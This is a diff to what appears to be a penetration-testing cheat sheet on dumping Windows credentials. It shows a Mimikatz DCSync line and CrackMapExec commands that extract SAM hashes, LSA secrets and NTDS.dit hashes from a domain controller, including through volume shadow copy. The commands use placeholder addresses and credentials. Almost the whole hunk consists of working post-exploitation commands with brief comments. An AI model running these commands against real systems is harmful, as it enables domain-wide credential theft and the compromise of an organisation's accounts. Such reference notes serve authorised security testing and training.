@@ -110,12 +110,14 @@ Or use Mimikatz to extract hashes from NTDS.dit
 mimikatz # lsadump::dcsync /domain:domain.local /all /csv          
 
 ## Crackmapexec     
+Dump SAM using adminc creds   
+
+    crackmapexec smb 10.10.10.10 -u UserNAme -p 'PASSWORDH' --sam   #dump SAM - needs admin creds      
 Dump LSA secrets     
 
     crackmapexec smb 10.10.10.10 -u UserNAme -p 'PASSWORDH' --lsa   #dump lsa secrets - need admin on domain controller          
-Dump NTDS.dit   
+Dump NTDS.dit using secretsdump - needs admin creds on a DC:        
 
-    crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORD' --ntds     
-    crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORD' --ntds --users     
-    crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORD' --ntds uusers --enabled      
-    crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORD' --ntds vss     
+    crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORD' --ntds     #dump all hashes    
+    crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORD' --ntds --users         
+    crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORD' --ntds vss     #uses volume shadow copy service to dump hashes     
